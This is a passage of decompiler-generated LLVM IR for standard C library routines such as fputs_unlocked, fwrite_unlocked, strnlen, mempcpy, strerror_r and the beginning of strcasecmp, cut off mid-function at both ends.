dec_label_pc_804ea8f:                             ; preds = %dec_label_pc_804ea77.dec_label_pc_804ea8f_crit_edge, %dec_label_pc_804ea68
  %v2_804eac3 = phi i32 [ %v0_804ea8f.pre, %dec_label_pc_804ea77.dec_label_pc_804ea8f_crit_edge ], [ %v4_804ea58, %dec_label_pc_804ea68 ]
  %v1_804ea8f = inttoptr i32 %v2_804eac3 to i32*
  %v2_804ea8f = load i32, i32* %v1_804ea8f, align 4
  store i32 %v2_804ea8f, i32* @ecx, align 4
  %v1_804ea91 = urem i32 %v2_804ea8f, 65536
  store i32 %v1_804ea91, i32* %edx.global-to-local, align 4
  %v2_804ea94 = and i32 %v2_804ea8f, 2
  %v3_804ea94 = icmp eq i32 %v2_804ea94, 0
  br i1 %v3_804ea94, label %dec_label_pc_804eab2, label %dec_label_pc_804ea99

dec_label_pc_804ea99:                             ; preds = %dec_label_pc_804ea8f
  %v1_804ea99 = urem i32 %v2_804ea8f, 2
  store i32 %v1_804ea99, i32* %edx.global-to-local, align 4
  %v1_804ea9c = add i32 %v2_804ea8f, 65535
  %v1_804ea9f = trunc i32 %v1_804ea9c to i16
  %v3_804ea9f = inttoptr i32 %v2_804eac3 to i16*
  store i16 %v1_804ea9f, i16* %v3_804ea9f, align 2
  %v0_804eaa2 = load i32, i32* @ebx, align 4
  %v1_804eaa2 = load i32, i32* %edx.global-to-local, align 4
  %v2_804eaa2 = mul i32 %v1_804eaa2, 4
  %v3_804eaa2 = add i32 %v0_804eaa2, 36
  %v4_804eaa2 = add i32 %v3_804eaa2, %v2_804eaa2
  %v5_804eaa2 = inttoptr i32 %v4_804eaa2 to i8*
  %v6_804eaa2 = load i8, i8* %v5_804eaa2, align 1
  %v7_804eaa2 = zext i8 %v6_804eaa2 to i32
  %v9_804eaa2 = and i32 %v1_804eaa2, -256
  %v10_804eaa2 = or i32 %v7_804eaa2, %v9_804eaa2
  store i32 %v10_804eaa2, i32* %edx.global-to-local, align 4
  %v1_804eaa6 = add i32 %v0_804eaa2, 40
  %v2_804eaa6 = inttoptr i32 %v1_804eaa6 to i32*
  store i32 0, i32* %v2_804eaa6, align 4
  %v0_804eaad = load i32, i32* %edx.global-to-local, align 4
  %v1_804eaad = urem i32 %v0_804eaad, 256
  store i32 %v1_804eaad, i32* @edx, align 4
  br label %dec_label_pc_804eb29

dec_label_pc_804eab2:                             ; preds = %dec_label_pc_804ea8f
  %v1_804eab2 = add i32 %v2_804eac3, 16
  %v2_804eab2 = inttoptr i32 %v1_804eab2 to i32*
  %v3_804eab2 = load i32, i32* %v2_804eab2, align 4
  store i32 %v3_804eab2, i32* @eax, align 4
  %v1_804eab5 = add i32 %v2_804eac3, 20
  %v2_804eab5 = inttoptr i32 %v1_804eab5 to i32*
  %v3_804eab5 = load i32, i32* %v2_804eab5, align 4
  %v15_804eab5 = icmp eq i32 %v3_804eab5, %v3_804eab2
  %v1_804eab8 = icmp eq i1 %v15_804eab5, false
  br i1 %v1_804eab8, label %dec_label_pc_804eb01, label %dec_label_pc_804eaba

dec_label_pc_804eaba:                             ; preds = %dec_label_pc_804eab2
  %v1_804eaba = add i32 %v2_804eac3, 4
  %v2_804eaba = inttoptr i32 %v1_804eaba to i32*
  %v3_804eaba = load i32, i32* %v2_804eaba, align 4
  %v13_804eaba = icmp eq i32 %v3_804eaba, -2
  %v1_804eabe = icmp eq i1 %v13_804eaba, false
  br i1 %v1_804eabe, label %dec_label_pc_804eac8, label %dec_label_pc_804eac0

dec_label_pc_804eac0:                             ; preds = %dec_label_pc_804eaba
  %v1_804eac0 = or i32 %v2_804ea8f, 4
  store i32 %v1_804eac0, i32* @ecx, align 4
  %v1_804eac3 = trunc i32 %v1_804eac0 to i16
  %v3_804eac3 = inttoptr i32 %v2_804eac3 to i16*
  store i16 %v1_804eac3, i16* %v3_804eac3, align 2
  br label %dec_label_pc_804eb26

dec_label_pc_804eac8:                             ; preds = %dec_label_pc_804eaba
  %v1_804eac8 = udiv i32 %v2_804ea8f, 256
  %v2_804eac8 = trunc i32 %v1_804eac8 to i8
  %v3_804eac8 = urem i8 %v2_804eac8, 4
  %v4_804eac8 = icmp eq i8 %v3_804eac8, 0
  %v8_804eac8 = zext i8 %v3_804eac8 to i32
  %v10_804eac8 = mul nuw nsw i32 %v8_804eac8, 256
  %v11_804eac8 = urem i32 %v2_804ea8f, 256
  %v12_804eac8 = or i32 %v10_804eac8, %v11_804eac8
  store i32 %v12_804eac8, i32* %edx.global-to-local, align 4
  br i1 %v4_804eac8, label %dec_label_pc_804eadd, label %dec_label_pc_804eacd

dec_label_pc_804eacd:                             ; preds = %dec_label_pc_804eac8
  %v3_804ead5 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_805218c.104 to i16*))
  %v0_804eadd.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804eadd

dec_label_pc_804eadd:                             ; preds = %dec_label_pc_804eac8, %dec_label_pc_804eacd
  %v0_804eb12 = phi i32 [ %v2_804eac3, %dec_label_pc_804eac8 ], [ %v0_804eadd.pre, %dec_label_pc_804eacd ]
  %v1_804eadd = add i32 %v0_804eb12, 8
  %v2_804eadd = inttoptr i32 %v1_804eadd to i32*
  %v3_804eadd = load i32, i32* %v2_804eadd, align 4
  %v1_804eae0 = add i32 %v0_804eb12, 12
  %v2_804eae0 = inttoptr i32 %v1_804eae0 to i32*
  %v3_804eae0 = load i32, i32* %v2_804eae0, align 4
  %v15_804eae0 = icmp eq i32 %v3_804eae0, %v3_804eadd
  br i1 %v15_804eae0, label %dec_label_pc_804eb0a, label %dec_label_pc_804eae5

dec_label_pc_804eae5:                             ; preds = %dec_label_pc_804eadd
  %v2_804eae8 = add i32 %v0_804eb12, 24
  %v3_804eae8 = inttoptr i32 %v2_804eae8 to i32*
  store i32 %v3_804eadd, i32* %v3_804eae8, align 4
  %v0_804eaeb = load i32, i32* @ebx, align 4
  %v2_804eaec = call i32 @__stdio_rfill(i32 %v0_804eaeb)
  %v1_804eaf4 = icmp eq i32 %v2_804eaec, 0
  br i1 %v1_804eaf4, label %dec_label_pc_804eb26, label %dec_label_pc_804eaf8

dec_label_pc_804eaf8:                             ; preds = %dec_label_pc_804eae5
  %v0_804eaf8 = load i32, i32* @ebx, align 4
  %v1_804eaf8 = add i32 %v0_804eaf8, 20
  %v2_804eaf8 = inttoptr i32 %v1_804eaf8 to i32*
  %v3_804eaf8 = load i32, i32* %v2_804eaf8, align 4
  %v2_804eafb = add i32 %v0_804eaf8, 24
  %v3_804eafb = inttoptr i32 %v2_804eafb to i32*
  store i32 %v3_804eaf8, i32* %v3_804eafb, align 4
  %v0_804eafe = load i32, i32* @ebx, align 4
  %v1_804eafe = add i32 %v0_804eafe, 16
  %v2_804eafe = inttoptr i32 %v1_804eafe to i32*
  %v3_804eafe = load i32, i32* %v2_804eafe, align 4
  br label %dec_label_pc_804eb01

dec_label_pc_804eb01:                             ; preds = %dec_label_pc_804eab2, %entry, %dec_label_pc_804eaf8
  %v1_804eb05 = phi i32 [ %v2_804eac3, %dec_label_pc_804eab2 ], [ %v4_804ea58, %entry ], [ %v0_804eafe, %dec_label_pc_804eaf8 ]
  %v0_804eb01 = phi i32 [ %v3_804eab2, %dec_label_pc_804eab2 ], [ %v3_804ea5c, %entry ], [ %v3_804eafe, %dec_label_pc_804eaf8 ]
  %v1_804eb01 = inttoptr i32 %v0_804eb01 to i8*
  %v2_804eb01 = load i8, i8* %v1_804eb01, align 1
  %v3_804eb01 = zext i8 %v2_804eb01 to i32
  store i32 %v3_804eb01, i32* @edx, align 4
  %v1_804eb04 = add i32 %v0_804eb01, 1
  %v2_804eb05 = add i32 %v1_804eb05, 16
  %v3_804eb05 = inttoptr i32 %v2_804eb05 to i32*
  store i32 %v1_804eb04, i32* %v3_804eb05, align 4
  %v0_804eb29.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804eb29

dec_label_pc_804eb0a:                             ; preds = %dec_label_pc_804eadd
  %v2_804eb0d = ptrtoint i8* %stack_var_-5 to i32
  %v5_804eb12 = inttoptr i32 %v0_804eb12 to i16*
  %v5_804eb13 = call i32 @__stdio_READ(i16* %v5_804eb12, i32 %v2_804eb0d, i32 1)
  %v1_804eb1b = icmp eq i32 %v5_804eb13, 0
  br i1 %v1_804eb1b, label %dec_label_pc_804eb26, label %dec_label_pc_804eb1f

dec_label_pc_804eb1f:                             ; preds = %dec_label_pc_804eb0a
  %v3_804eb1f = load i8, i8* %stack_var_-5, align 1
  %v4_804eb1f = sext i8 %v3_804eb1f to i32
  store i32 %v4_804eb1f, i32* @edx, align 4
  br label %dec_label_pc_804eb29

dec_label_pc_804eb26:                             ; preds = %dec_label_pc_804eb0a, %dec_label_pc_804eae5, %dec_label_pc_804ea77, %dec_label_pc_804eac0
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_804eb29

dec_label_pc_804eb29:                             ; preds = %dec_label_pc_804eb1f, %dec_label_pc_804eb01, %dec_label_pc_804ea99, %dec_label_pc_804eb26
  %v0_804eb29 = phi i32 [ %v4_804eb1f, %dec_label_pc_804eb1f ], [ %v0_804eb29.pre, %dec_label_pc_804eb01 ], [ %v1_804eaad, %dec_label_pc_804ea99 ], [ -1, %dec_label_pc_804eb26 ]
  store i32 %v0_804ea54, i32* @ebx, align 4
  ret i32 %v0_804eb29

; uselistorder directives
  uselistorder i32 %v0_804eb01, { 1, 0 }
  uselistorder i32 %v3_804eadd, { 1, 0 }
  uselistorder i32 %v0_804eb12, { 0, 1, 3, 2 }
  uselistorder i8 %v3_804eac8, { 1, 0 }
  uselistorder i32 %v3_804eab2, { 1, 0, 2 }
  uselistorder i32 %v1_804eaad, { 1, 0 }
  uselistorder i32 %v2_804ea8f, { 1, 0, 4, 5, 2, 6, 3, 7 }
  uselistorder i32 %v2_804eac3, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i32 36, { 8, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 18, 1, 2, 19, 3 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_804eb29, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804eb26, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804eb01, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804eadd, { 1, 0 }
}

define i32 @__GI_fputs_unlocked() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_3()
  %stack_var_-8 = alloca i32, align 4
  %v0_804eb30 = load i32, i32* @esi, align 4
  %v0_804eb31 = load i32, i32* @ebx, align 4
  store i32 %v0_804eb31, i32* %stack_var_-8, align 4
  %v4_804eb35 = ptrtoint i8* %tmp4 to i32
  store i32 %v4_804eb35, i32* @ebx, align 4
  %v3_804eb3a = call i32 @strlen(i8* %tmp4)
  store i32 %v3_804eb3a, i32* @esi, align 4
  %v0_804eb4b = load i32, i32* @ebx, align 4
  %v6_804eb4c = call i32 @__GI_fwrite_unlocked(i32 %v0_804eb4b, i64 1, i32 %v3_804eb3a, i32 %tmp)
  %v1_804eb57 = load i32, i32* @esi, align 4
  %v12_804eb57 = icmp eq i32 %v6_804eb4c, %v1_804eb57
  %v1_804eb59 = icmp eq i1 %v12_804eb57, false
  br i1 %v1_804eb59, label %dec_label_pc_804eb5d, label %dec_label_pc_804eb5b

dec_label_pc_804eb5b:                             ; preds = %entry
  br label %dec_label_pc_804eb5d

dec_label_pc_804eb5d:                             ; preds = %entry, %dec_label_pc_804eb5b
  %v0_804eb5d = phi i32 [ -1, %entry ], [ %v6_804eb4c, %dec_label_pc_804eb5b ]
  %v2_804eb60 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804eb60, i32* @ebx, align 4
  store i32 %v0_804eb30, i32* @esi, align 4
  ret i32 %v0_804eb5d

; uselistorder directives
  uselistorder i32 %v6_804eb4c, { 1, 0 }
  uselistorder i8* %tmp4, { 1, 0 }
  uselistorder label %dec_label_pc_804eb5d, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_804eb64 = load i32, i32* @edi, align 4
  %v0_804eb65 = load i32, i32* @esi, align 4
  %v0_804eb66 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_804eb6b = trunc i64 %arg2 to i32
  store i32 %v4_804eb6b, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_804eb73 = inttoptr i32 %arg4 to i16*
  %v2_804eb73 = load i16, i16* %v1_804eb73, align 2
  %v1_804eb76 = and i16 %v2_804eb73, 192
  %v6_804eb7b = icmp eq i16 %v1_804eb76, 192
  br i1 %v6_804eb7b, label %dec_label_pc_804eb96, label %dec_label_pc_804eb82

dec_label_pc_804eb82:                             ; preds = %entry
  %v0_804eb82 = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v9_804eb8a = call i32 @__stdio_trans2w_o(i16* %v1_804eb73, i32 128, i32 %v0_804eb82, i32 %v0_804eb82, i32 %v0_804eb66, i32 %v0_804eb65, i32 %v0_804eb64)
  %v1_804eb92 = icmp eq i32 %v9_804eb8a, 0
  %v1_804eb94 = icmp eq i1 %v1_804eb92, false
  br i1 %v1_804eb94, label %dec_label_pc_804ebd2, label %dec_label_pc_804eb96

dec_label_pc_804eb96:                             ; preds = %dec_label_pc_804eb82, %entry
  %v2_804eb96 = icmp eq i32 %v4_804eb6b, 0
  br i1 %v2_804eb96, label %dec_label_pc_804ebd2, label %dec_label_pc_804eb9a

dec_label_pc_804eb9a:                             ; preds = %dec_label_pc_804eb96
  %v1_804eb9a = icmp eq i32 %arg3, 0
  br i1 %v1_804eb9a, label %dec_label_pc_804ebd2, label %dec_label_pc_804eb9e

dec_label_pc_804eb9e:                             ; preds = %dec_label_pc_804eb9a
  %v9_804eba3 = udiv i64 4294967295, %arg2
  %v10_804eba3 = trunc i64 %v9_804eba3 to i32
  %v6_804eba7 = icmp ult i32 %v10_804eba3, %arg3
  br i1 %v6_804eba7, label %dec_label_pc_804ebc3, label %dec_label_pc_804eba9

dec_label_pc_804eba9:                             ; preds = %dec_label_pc_804eb9e
  %sext = mul i64 %arg2, 4294967296
  %v2_804ebac = sdiv i64 %sext, 4294967296
  %v3_804ebac = sext i32 %arg3 to i64
  %v4_804ebac = mul nsw i64 %v3_804ebac, %v2_804ebac
  %v5_804ebac = trunc i64 %v4_804ebac to i32
  %v0_804ebaf = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_804ebb5 = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_804ebac, i32 %v0_804ebaf, i32 %v10_804eba3)
  %v6_804ebb5 = sext i32 %v5_804ebb5 to i64
  %v10_804ebbc = udiv i64 %v6_804ebb5, %arg2
  %v11_804ebbc = trunc i64 %v10_804ebbc to i32
  br label %dec_label_pc_804ebd4

dec_label_pc_804ebc3:                             ; preds = %dec_label_pc_804eb9e
  %v0_804ebc3 = load i32, i32* @ebx, align 4
  %v1_804ebc3 = inttoptr i32 %v0_804ebc3 to i16*
  %v2_804ebc3 = load i16, i16* %v1_804ebc3, align 2
  %v3_804ebc3 = or i16 %v2_804ebc3, 8
  store i16 %v3_804ebc3, i16* %v1_804ebc3, align 2
  %v0_804ebc7 = load i32, i32* %stack_var_-28, align 4
  %v1_804ebc7 = call i32 @__errno_location(i32 %v0_804ebc7)
  %v1_804ebcc = inttoptr i32 %v1_804ebc7 to i32*
  store i32 22, i32* %v1_804ebcc, align 4
  br label %dec_label_pc_804ebd2

dec_label_pc_804ebd2:                             ; preds = %dec_label_pc_804eb9a, %dec_label_pc_804eb96, %dec_label_pc_804eb82, %dec_label_pc_804ebc3
  br label %dec_label_pc_804ebd4

dec_label_pc_804ebd4:                             ; preds = %dec_label_pc_804eba9, %dec_label_pc_804ebd2
  %v0_804ebd7 = phi i32 [ %v11_804ebbc, %dec_label_pc_804eba9 ], [ 0, %dec_label_pc_804ebd2 ]
  store i32 %v0_804eb65, i32* @esi, align 4
  store i32 %v0_804eb64, i32* @edi, align 4
  ret i32 %v0_804ebd7

; uselistorder directives
  uselistorder i32 %v0_804eb82, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 128, { 6, 7, 11, 14, 0, 15, 16, 4, 1, 18, 10, 12, 2, 3, 8, 9, 13, 5, 17 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804ebd4, { 1, 0 }
  uselistorder label %dec_label_pc_804ebd2, { 3, 0, 1, 2 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_3()
  %v4_804ebd8 = ptrtoint i8* %tmp4 to i32
  %v8_804ebeb5 = icmp eq i32 %tmp, 0
  %v1_804ebec6 = icmp eq i1 %v8_804ebeb5, false
  br i1 %v1_804ebec6, label %dec_label_pc_804ebe5, label %dec_label_pc_804ebee

dec_label_pc_804ebe5:                             ; preds = %entry, %dec_label_pc_804ebea
  %v1_804ebeb8 = phi i32 [ %v1_804ebeb, %dec_label_pc_804ebea ], [ %tmp, %entry ]
  %v0_804ebee7 = phi i32 [ %v1_804ebea, %dec_label_pc_804ebea ], [ %v4_804ebd8, %entry ]
  %v1_804ebe5 = inttoptr i32 %v0_804ebee7 to i8*
  %v2_804ebe5 = load i8, i8* %v1_804ebe5, align 1
  %v3_804ebe5 = icmp eq i8 %v2_804ebe5, 0
  br i1 %v3_804ebe5, label %dec_label_pc_804ebee, label %dec_label_pc_804ebea

dec_label_pc_804ebea:                             ; preds = %dec_label_pc_804ebe5
  %v1_804ebea = add i32 %v0_804ebee7, 1
  %v1_804ebeb = add i32 %v1_804ebeb8, -1
  %v8_804ebeb = icmp eq i32 %v1_804ebeb, 0
  %v1_804ebec = icmp eq i1 %v8_804ebeb, false
  br i1 %v1_804ebec, label %dec_label_pc_804ebe5, label %dec_label_pc_804ebee

dec_label_pc_804ebee:                             ; preds = %dec_label_pc_804ebea, %dec_label_pc_804ebe5, %entry
  %v0_804ebee.lcssa = phi i32 [ %v4_804ebd8, %entry ], [ %v0_804ebee7, %dec_label_pc_804ebe5 ], [ %v1_804ebea, %dec_label_pc_804ebea ]
  %v2_804ebee = sub i32 %v0_804ebee.lcssa, %v4_804ebd8
  ret i32 %v2_804ebee

; uselistorder directives
  uselistorder i32 %v1_804ebeb, { 1, 0 }
  uselistorder i32 %v0_804ebee7, { 0, 2, 1 }
  uselistorder i32 %v4_804ebd8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ebe5, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_804ebf4 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_804ec07 = inttoptr i32 %arg1 to i16*
  %v4_804ec07 = call i32 @memcpy(i16* %v3_804ec07, i32 %arg2, i32 %arg3)
  %v0_804ec0c = load i32, i32* @esi, align 4
  %v2_804ec0c = add i32 %v0_804ec0c, %arg3
  store i32 %v0_804ebf4, i32* @esi, align 4
  ret i32 %v2_804ec0c
}

define i32 @__GI___glibc_strerror_r() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_804ec29 = call i32 @__xpg_strerror_r(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_804ec2e = load i32, i32* @ebx, align 4
  ret i32 %v0_804ec2e
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_804ec4a = icmp ugt i32 %arg1, 124
  br i1 %v6_804ec4a, label %dec_label_pc_804ec67, label %dec_label_pc_804ec4c

dec_label_pc_804ec4c:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_8050a40.124 to i32), i32* @esi, align 4
  %v1_804ec5c4 = icmp eq i32 %arg1, 0
  %v1_804ec5e11 = icmp eq i1 %v1_804ec5c4, false
  br i1 %v1_804ec5e11, label %dec_label_pc_804ec55, label %dec_label_pc_804ec60

dec_label_pc_804ec55:                             ; preds = %dec_label_pc_804ec4c, %dec_label_pc_804ec55
  %v0_804ec58 = phi i32 [ %v3_804ec58, %dec_label_pc_804ec55 ], [ %arg1, %dec_label_pc_804ec4c ]
  %v0_804ec5b = phi i32 [ %v1_804ec5b, %dec_label_pc_804ec55 ], [ ptrtoint ([8 x i8]* @global_var_8050a40.124 to i32), %dec_label_pc_804ec4c ]
  %v1_804ec55 = inttoptr i32 %v0_804ec5b to i8*
  %v2_804ec55 = load i8, i8* %v1_804ec55, align 1
  %v7_804ec55 = icmp eq i8 %v2_804ec55, 0
  %v2_804ec58 = zext i1 %v7_804ec55 to i32
  %v3_804ec58 = add i32 %v2_804ec58, %v0_804ec58
  %v16_804ec58 = icmp eq i32 %v3_804ec58, 0
  %v1_804ec5b = add i32 %v0_804ec5b, 1
  store i32 %v1_804ec5b, i32* @esi, align 4
  %v1_804ec5e = icmp eq i1 %v16_804ec58, false
  br i1 %v1_804ec5e, label %dec_label_pc_804ec55, label %dec_label_pc_804ec60

dec_label_pc_804ec60:                             ; preds = %dec_label_pc_804ec55, %dec_label_pc_804ec4c
  %v0_804ec62 = phi i32 [ ptrtoint ([8 x i8]* @global_var_8050a40.124 to i32), %dec_label_pc_804ec4c ], [ %v1_804ec5b, %dec_label_pc_804ec55 ]
  store i32 0, i32* @ebp, align 4
  %v1_804ec62 = inttoptr i32 %v0_804ec62 to i8*
  %v2_804ec62 = load i8, i8* %v1_804ec62, align 1
  %v3_804ec62 = icmp eq i8 %v2_804ec62, 0
  %v1_804ec65 = icmp eq i1 %v3_804ec62, false
  br i1 %v1_804ec65, label %dec_label_pc_804ec60.dec_label_pc_804ec96_crit_edge, label %dec_label_pc_804ec67

dec_label_pc_804ec60.dec_label_pc_804ec96_crit_edge: ; preds = %dec_label_pc_804ec60
  br label %dec_label_pc_804ec96

dec_label_pc_804ec67:                             ; preds = %dec_label_pc_804ec60, %entry
  store i32 22, i32* @ebp, align 4
  %v1_804ec6f = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  %v6_804ec7b = bitcast i32* %stack_var_-17 to i8*
  %v7_804ec7b = call i32 @_uintmaxtostr(i8* %v6_804ec7b, i32 %arg1, i32 %v1_804ec6f, i32 -10, i32 0)
  %v1_804ec83 = add i32 %v7_804ec7b, -14
  store i32 %v1_804ec83, i32* @esi, align 4
  %v5_804ec8d = inttoptr i32 %v1_804ec83 to i8*
  store i8* %v5_804ec8d, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_804ec83 to i16*
  %v6_804ec8e = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_8050a1e.125 to i32), i32 14)
  %v0_804eca5.pre = load i32, i32* @edi, align 4
  %v0_804eca7.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ec96

dec_label_pc_804ec96:                             ; preds = %dec_label_pc_804ec60.dec_label_pc_804ec96_crit_edge, %dec_label_pc_804ec67
  %v0_804eca7 = phi i32 [ %v0_804ec62, %dec_label_pc_804ec60.dec_label_pc_804ec96_crit_edge ], [ %v0_804eca7.pre, %dec_label_pc_804ec67 ]
  %v0_804eca5 = phi i32 [ %arg3, %dec_label_pc_804ec60.dec_label_pc_804ec96_crit_edge ], [ %v0_804eca5.pre, %dec_label_pc_804ec67 ]
  %v4_804ec98 = icmp eq i32 %arg2, 0
  %v1_804ec9d = icmp eq i1 %v4_804ec98, false
  %v2_804eca5 = select i1 %v1_804ec9d, i32 %v0_804eca5, i32 0
  store i32 %v2_804eca5, i32* @edi, align 4
  %v5_804eca7 = inttoptr i32 %v0_804eca7 to i8*
  store i8* %v5_804eca7, i8** %stack_var_-108, align 4
  %v3_804eca8 = call i32 @strlen(i8* %v5_804eca7)
  %v1_804ecb0 = add i32 %v3_804eca8, 1
  store i32 %v1_804ecb0, i32* %ebx.global-to-local, align 4
  %v1_804ecb3 = load i32, i32* @edi, align 4
  %tmp46 = icmp ugt i32 %v1_804ecb0, %v1_804ecb3
  br i1 %tmp46, label %dec_label_pc_804ecb7, label %dec_label_pc_804ecbe

dec_label_pc_804ecb7:                             ; preds = %dec_label_pc_804ec96
  store i32 %v1_804ecb3, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_804ecbe

dec_label_pc_804ecbe:                             ; preds = %dec_label_pc_804ec96, %dec_label_pc_804ecb7
  %v0_804ecc3 = phi i32 [ %v1_804ecb0, %dec_label_pc_804ec96 ], [ %v1_804ecb3, %dec_label_pc_804ecb7 ]
  %v1_804ecbe = icmp eq i32 %v0_804ecc3, 0
  br i1 %v1_804ecbe, label %dec_label_pc_804ecda, label %dec_label_pc_804ecc2

dec_label_pc_804ecc2:                             ; preds = %dec_label_pc_804ecbe
  %v0_804ecc4 = load i32, i32* @esi, align 4
  %v8_804ecc5 = inttoptr i32 %arg2 to i8*
  store i8* %v8_804ecc5, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_804ecc9 = call i32 @memcpy(i16* %tmp45, i32 %v0_804ecc4, i32 %v0_804ecc3)
  %v1_804ecd5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ecd5 = add i32 %arg2, -1
  %v3_804ecd5 = add i32 %v2_804ecd5, %v1_804ecd5
  %v4_804ecd5 = inttoptr i32 %v3_804ecd5 to i8*
  store i8 0, i8* %v4_804ecd5, align 1
  br label %dec_label_pc_804ecda

dec_label_pc_804ecda:                             ; preds = %dec_label_pc_804ecbe, %dec_label_pc_804ecc2
  %v0_804ecda = load i32, i32* @ebp, align 4
  %v1_804ecda = icmp eq i32 %v0_804ecda, 0
  br i1 %v1_804ecda, label %dec_label_pc_804ece5, label %dec_label_pc_804ecde

dec_label_pc_804ecde:                             ; preds = %dec_label_pc_804ecda
  %v0_804ecde = load i8*, i8** %stack_var_-108, align 4
  %v1_804ecde = ptrtoint i8* %v0_804ecde to i32
  %v2_804ecde = call i32 @__errno_location(i32 %v1_804ecde)
  %v0_804ece3 = load i32, i32* @ebp, align 4
  %v2_804ece3 = inttoptr i32 %v2_804ecde to i32*
  store i32 %v0_804ece3, i32* %v2_804ece3, align 4
  %v0_804ece8.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804ece5

dec_label_pc_804ece5:                             ; preds = %dec_label_pc_804ecda, %dec_label_pc_804ecde
  %v0_804ece8 = phi i32 [ 0, %dec_label_pc_804ecda ], [ %v0_804ece8.pre, %dec_label_pc_804ecde ]
  ret i32 %v0_804ece8

; uselistorder directives
  uselistorder i32 %v1_804ecb3, { 1, 2, 0 }
  uselistorder i32 %v1_804ecb0, { 1, 0, 2 }
  uselistorder i32 %v1_804ec83, { 1, 0, 2 }
  uselistorder i32 %v1_804ec5b, { 0, 2, 1 }
  uselistorder i32 %v3_804ec58, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 34, { 11, 2, 3, 4, 5, 6, 7, 8, 10, 12, 13, 9, 0, 1, 14, 15 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_8050a40.124 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_804ece5, { 1, 0 }
  uselistorder label %dec_label_pc_804ecda, { 1, 0 }
  uselistorder label %dec_label_pc_804ecbe, { 1, 0 }
  uselistorder label %dec_label_pc_804ec96, { 1, 0 }
  uselistorder label %dec_label_pc_804ec55, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_804ecf2 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804ecf2, i32* @ecx, align 4
  %v0_804ecfc = load i32, i32* bitcast (i32** @global_var_80522d4.113 to i32*), align 4
  br label %dec_label_pc_804ed02

dec_label_pc_804ed02:                             ; preds = %dec_label_pc_804ed1f, %entry
  %v0_804ed256 = phi i32 [ %v0_804ed257, %dec_label_pc_804ed1f ], [ 0, %entry ]
  %v0_804ed1f = phi i32 [ %v1_804ed1f, %dec_label_pc_804ed1f ], [ %arg2, %entry ]
  %v0_804ed20 = phi i32 [ %v1_804ed20, %dec_label_pc_804ed1f ], [ %v4_804ecf2, %entry ]
  %v12_804ed02 = icmp eq i32 %v0_804ed20, %v0_804ed1f
  %.pre = inttoptr i32 %v0_804ed20 to i8*
  br i1 %v12_804ed02, label %dec_label_pc_804ed1a, label %dec_label_pc_804ed06

dec_label_pc_804ed06:                             ; preds = %dec_label_pc_804ed02
  %v2_804ed06 = load i8, i8* %.pre, align 1
  %v3_804ed06 = zext i8 %v2_804ed06 to i32
